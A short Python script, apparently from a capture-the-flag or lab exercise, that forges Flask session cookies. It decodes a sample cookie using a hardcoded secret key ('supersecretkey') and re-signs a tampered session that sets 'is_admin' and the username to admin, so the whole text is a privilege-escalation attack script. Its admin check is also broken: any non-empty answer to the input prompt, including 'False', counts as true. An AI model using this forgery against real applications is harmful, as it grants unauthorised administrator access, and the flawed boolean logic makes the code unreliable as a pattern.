from flask.sessions import SecureCookieSessionInterface

# Create a signing serializer that matches Flask's session system
class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    def get_signing_serializer(self, app):
        return super().get_signing_serializer(app)

# Set up a dummy Flask app just to get the serializer
from flask import Flask
app = Flask(__name__)
app.secret_key = 'supersecretkey'  # Your secret key

# Get the actual serializer used for Flask cookies
serializer = SimpleSecureCookieSessionInterface().get_signing_serializer(app)

# Your original cookie
cookie = 'eyJpc19hZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoidXNlciJ9.Z_QnZw.8kI38hpaav_9-3KX-Z7NZUruMtg'

# Deserialize the session data
data = serializer.loads(cookie)
print(data)

boolean_admin = input("admin permissions: True or False:")
if boolean_admin:
    username = "admin"
else:
    username = "user"
new_data = {'is_admin': boolean_admin, 'username': username}
new_cookie = serializer.dumps(new_data)
print(new_cookie)
